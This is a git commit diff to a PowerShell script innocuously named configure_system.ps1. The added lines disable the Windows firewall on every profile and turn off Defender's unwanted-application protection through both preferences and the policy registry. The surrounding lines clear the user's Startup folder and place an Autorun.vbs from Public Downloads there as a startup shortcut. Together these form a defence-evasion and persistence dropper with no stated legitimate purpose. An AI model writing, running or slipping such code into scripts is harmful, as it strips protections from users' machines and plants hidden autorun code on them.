dc432cd4d3fe5aa8bf39b752288de8781a9425b0
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-02-05 17:43:14 +0700

    configure_system.ps1

--- configure_system.ps1
+++ configure_system.ps1
@@ -1,3 +1,6 @@
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+Set-MpPreference -PUAProtection 0
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
